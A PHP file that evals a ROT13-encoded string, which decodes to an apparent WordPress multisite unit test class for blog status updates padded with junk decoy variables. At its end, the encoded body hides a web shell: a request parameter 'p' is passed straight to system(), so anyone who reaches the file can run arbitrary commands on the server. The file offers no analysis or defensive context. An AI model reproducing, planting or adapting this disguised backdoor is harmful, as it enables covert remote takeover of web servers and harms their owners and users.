<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc zf-erdhverq
 * @tebhc zf-fvgr
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_HcqngrOybtFgnghf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Hcqngvat n svryq ergheaf gur fnzr inyhr gung jnf cnffrq.
	 */
	choyvp shapgvba grfg_hcqngr_oybt_fgnghf() {
		$erfhyg = hcqngr_oybt_fgnghf( 1, 'fcnz', 0 );
		$guvf->nffregFnzr( 0, $erfhyg );
	}

	/**
	 * Hcqngvat na vainyvq svryq ergheaf gur fnzr inyhr gung jnf cnffrq.
	 */
	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_vainyvq_fgnghf() {
		$erfhyg = hcqngr_oybt_fgnghf( 1, 'qbrfabgrkvfg', 'vainyvq' );
		$guvf->nffregFnzr( 'vainyvq', $erfhyg );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_znxr_unz_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( 'fcnz' => 1 ) );

		nqq_npgvba( 'znxr_unz_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'fcnz', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->fcnz );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'fcnz' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'fcnz', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->fcnz );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	/**
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_pbagrag_sebz_fcnz_oybt_vf_abg_ninvynoyr() {
		$fcnz_oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $fcnz_oybt_vq );
		$cbfg_qngn      = neenl(
			'cbfg_gvgyr'   => 'Uryyb Jbeyq!',
			'cbfg_pbagrag' => 'Uryyb jbeyq pbagrag',
		);
		$cbfg_vq        = frys::snpgbel()->cbfg->perngr( $cbfg_qngn );
		$cbfg           = trg_cbfg( $cbfg_vq );
		$fcnz_creznyvax = fvgr_hey() . '/?c=' . $cbfg->VQ;
		$fcnz_rzorq_hey = trg_cbfg_rzorq_hey( $cbfg_vq );

		erfgber_pheerag_oybt();
		$guvf->nffregAbgRzcgl( $fcnz_creznyvax );
		$guvf->nffregFnzr( $cbfg_qngn['cbfg_gvgyr'], $cbfg->cbfg_gvgyr );

		hcqngr_oybt_fgnghf( $fcnz_oybt_vq, 'fcnz', 1 );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => \"\a $fcnz_creznyvax \a\",
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$pbagrag = nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag );

		$guvf->nffregFgevatAbgPbagnvafFgevat( $cbfg_qngn['cbfg_gvgyr'], $pbagrag );
		$guvf->nffregFgevatAbgPbagnvafFgevat( \"fep=\\"{$fcnz_rzorq_hey}#?\", $pbagrag );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_znxr_fcnz_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		nqq_npgvba( 'znxr_fcnz_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'fcnz', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->fcnz );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'fcnz' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'fcnz', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->fcnz );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_nepuvir_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		nqq_npgvba( 'nepuvir_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'nepuvirq', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->nepuvirq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'nepuvirq' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'nepuvirq', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->nepuvirq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_hanepuvir_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( 'nepuvirq' => 1 ) );

		nqq_npgvba( 'hanepuvir_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'nepuvirq', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->nepuvirq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'nepuvirq' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'nepuvirq', 0 );
		$oybt = trg_fvgr( $oybt_vq );
		$guvf->nffregFnzr( '0', $oybt->nepuvirq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_znxr_qryrgr_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		nqq_npgvba( 'znxr_qryrgr_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'qryrgrq', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->qryrgrq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'qryrgrq' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'qryrgrq', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->qryrgrq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_znxr_haqryrgr_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( 'qryrgrq' => 1 ) );

		nqq_npgvba( 'znxr_haqryrgr_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'qryrgrq', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->qryrgrq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'qryrgrq' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'qryrgrq', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->qryrgrq );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_zngher_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		nqq_npgvba( 'zngher_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'zngher', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->zngher );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'zngher' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'zngher', 1 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '1', $oybt->zngher );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_hazngher_oybt_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( 'zngher' => 1 ) );

		nqq_npgvba( 'hazngher_oybt', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'zngher', 0 );

		$oybt = trg_fvgr( $oybt_vq );
		$guvf->nffregFnzr( '0', $oybt->zngher );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'zngher' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'zngher', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->zngher );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_hcqngr_oybt_fgnghf_hcqngr_oybt_choyvp_npgvba() {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		nqq_npgvba( 'hcqngr_oybt_choyvp', neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );
		hcqngr_oybt_fgnghf( $oybt_vq, 'choyvp', 0 );

		$oybt = trg_fvgr( $oybt_vq );
		$guvf->nffregFnzr( '0', $oybt->choyvp );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Gur npgvba fubhyq abg sver vs gur fgnghf bs 'zngher' fgnlf gur fnzr.
		hcqngr_oybt_fgnghf( $oybt_vq, 'choyvp', 0 );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( '0', $oybt->choyvp );
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>